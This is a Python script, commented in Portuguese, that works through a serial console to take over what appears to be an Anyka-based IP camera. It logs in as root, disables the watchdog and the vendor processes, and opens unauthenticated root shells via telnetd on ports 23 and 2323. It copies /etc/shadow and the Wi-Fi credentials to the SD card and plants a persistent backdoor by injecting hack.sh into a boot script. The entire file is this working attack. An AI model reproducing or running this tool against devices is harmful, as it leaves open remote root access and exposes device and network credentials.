#!/usr/bin/env python3
"""
HACK SLOW - Envia um comando por vez com delays longos.
Cada comando eh curto e simples pra sobreviver ao ruido do IPC.
"""
import serial
import time
import sys

PORT = '/dev/ttyUSB0'
BAUD = 115200
SD = '/mnt/disc1'

def send_slow(ser, cmd, wait=2.0):
    """Envia comando caractere por caractere com delay"""
    ser.reset_input_buffer()
    time.sleep(0.3)

    # Envia char por char pra evitar corrupcao
    for ch in (cmd + '\r\n'):
        ser.write(ch.encode())
        time.sleep(0.008)  # 8ms entre chars

    time.sleep(wait)
    resp = ser.read(16384)
    return resp.decode('utf-8', errors='replace') if resp else ''


def main():
    ser = serial.Serial(PORT, BAUD, timeout=0.5)
    ser.reset_input_buffer()
    buf = b''

    print("=== HACK SLOW - Um comando por vez ===")
    print("Esperando login... desliga/religa camera!")
    print("=" * 50, flush=True)

    start = time.time()
    while time.time() - start < 300:
        data = ser.read(4096)
        if data:
            buf += data
            if b'login:' in buf[-500:]:
                print(f'\n[{time.time()-start:.0f}s] LOGIN!', flush=True)
                break
        elapsed = time.time() - start
        if elapsed % 30 < 0.6 and not data:
            print(f'[{elapsed:.0f}s] Esperando...', flush=True)
    else:
        print("Timeout 300s")
        ser.close()
        return

    # Login
    time.sleep(0.5)
    send_slow(ser, 'root', 3)
    print('Login enviado, esperando 5s pra boot acalmar...', flush=True)
    time.sleep(5)
    ser.read(65536)

    # Comandos individuais - curtos e simples
    commands = [
        # FASE 1: Sobrevivencia
        ("Anti-WD",         "(while true; do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&", 2),
        ("Kill debug",      "killall -9 shell_debug", 1),
        ("Kill IPC",        "killall -9 anyka_ipc", 2),
        ("Kill IPC2",       "killall -9 ipc", 1),
        ("Kill daemon",     "killall -9 daemon", 1),

        # Espera console acalmar
        ("Espera",          "sleep 3", 5),

        # FASE 2: Verifica
        ("Test",            f"echo ALIVE > {SD}/alive.txt", 2),
        ("ID",              f"id > {SD}/id.txt", 2),

        # FASE 3: Telnet
        ("Telnet23",        "telnetd -l /bin/sh", 1),
        ("Telnet2323",      "telnetd -l /bin/sh -p 2323", 1),

        # FASE 4: Dumps
        ("Passwd",          f"cp /etc/passwd {SD}/passwd.txt", 2),
        ("Shadow",          f"cp /etc/shadow {SD}/shadow.txt", 2),
        ("Inittab",         f"cat /etc/inittab>{SD}/inittab.txt", 2),
        ("RC.local",        f"cat /etc/init.d/rc.local>{SD}/rc_local.txt", 2),
        ("Setup",           f"cat /ipc/setup.sh>{SD}/setup.txt 2>/dev/null", 2),
        ("Mount",           f"mount>{SD}/mount.txt", 2),
        ("MTD",             f"cat /proc/mtd>{SD}/mtd.txt", 2),
        ("PS",              f"ps>{SD}/ps.txt", 2),
        ("Ifconfig",        f"ifconfig -a>{SD}/ifconfig.txt", 2),
        ("ROM list",        f"ls -laR /rom/>{SD}/rom_list.txt", 2),
        ("JFFS2 list",      f"ls -laR /etc/jffs2/>{SD}/jffs2_list.txt", 2),
        ("Dmesg",           f"dmesg>{SD}/dmesg.txt", 2),
        ("Busybox",         f"busybox --list>{SD}/busybox.txt", 2),
        ("CPUinfo",         f"cat /proc/cpuinfo>{SD}/cpuinfo.txt", 2),
        ("Cmdline",         f"cat /proc/cmdline>{SD}/cmdline.txt", 2),
        ("ROM all",         f"cd /rom;for f in *;do echo =$f;cat $f 2>/dev/null;done>{SD}/rom_all.txt;cd /", 4),
        ("JFFS2 all",       f"cd /etc/jffs2;for f in *;do echo =$f;cat $f 2>/dev/null;done>{SD}/jffs2_all.txt;cd /", 4),
        ("InitD all",       f"cd /etc/init.d;for f in *;do echo =$f;cat $f;done>{SD}/initd_all.txt;cd /", 4),
        ("NetJSON",         f"cat /etc/jffs2/config/*.json>{SD}/json.txt 2>/dev/null", 2),
        ("DevConfig",       f"cat /rom/device.config>{SD}/devconfig.txt 2>/dev/null", 2),
        ("WPA",             f"cat /etc/wpa_supplicant.conf>{SD}/wpa.txt 2>/dev/null", 2),

        # FASE 5: Hack persistente
        ("Hack.sh",         "echo '#!/bin/sh' > /rom/hack.sh", 2),
        ("Hack.sh L2",      "echo '(while true;do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&'>>/rom/hack.sh", 2),
        ("Hack.sh L3",      "echo 'telnetd -l /bin/sh &'>>/rom/hack.sh", 2),
        ("Hack.sh L4",      "echo 'telnetd -l /bin/sh -p 2323 &'>>/rom/hack.sh", 2),
        ("Chmod",           "chmod +x /rom/hack.sh", 1),
        ("Inject TZ",       "grep -q hack /rom/time_zone.sh 2>/dev/null||echo '/rom/hack.sh &'>>/rom/time_zone.sh", 2),
        ("Verify hack",     f"cat /rom/hack.sh>{SD}/hack_check.txt", 2),
        ("Verify TZ",       f"cat /rom/time_zone.sh>{SD}/tz_check.txt 2>/dev/null", 2),

        # FASE 6: Marca sucesso
        ("Success",         f"echo HACK_COMPLETE>{SD}/SUCCESS.txt", 2),
        ("Date",            f"date>>{SD}/SUCCESS.txt", 2),
    ]

    total = len(commands)
    for i, (desc, cmd, wait) in enumerate(commands):
        print(f'[{i+1}/{total}] {desc}: {cmd[:60]}', end='', flush=True)
        resp = send_slow(ser, cmd, wait)

        # Verifica se tem sinal de reboot
        if 'U-Boot' in resp or 'Starting kernel' in resp:
            print(' !! REBOOT DETECTADO !!', flush=True)
            break

        # Mostra se teve algo util na resposta
        clean = [l.strip() for l in resp.split('\n')
                 if l.strip() and not any(x in l for x in
                    ['p2pu_','evtimer_','cloudlinks','udhcpc:','sync cnt',
                     'dns_callback','check_dns','UploadDevCfg','scan result',
                     'CheckAPAvailable','TheTimes','dwLastConnect','SSID=Free',
                     'nowTxPackets','fgSendBroadcast','key.c:','IrCut','vWifi',
                     'VPSS','cloud-links','listsrv','evudp_sendto','http_list',
                     'timeout_query','EncType','Password='])]
        if clean:
            print(f' → {clean[0][:80]}', flush=True)
        else:
            print(' ok', flush=True)

    print('\n' + '=' * 50)
    print('HACK SLOW COMPLETO!')
    print('Tira o SD e verifica os .txt no PC')
    print('=' * 50)

    ser.close()


if __name__ == '__main__':
    main()
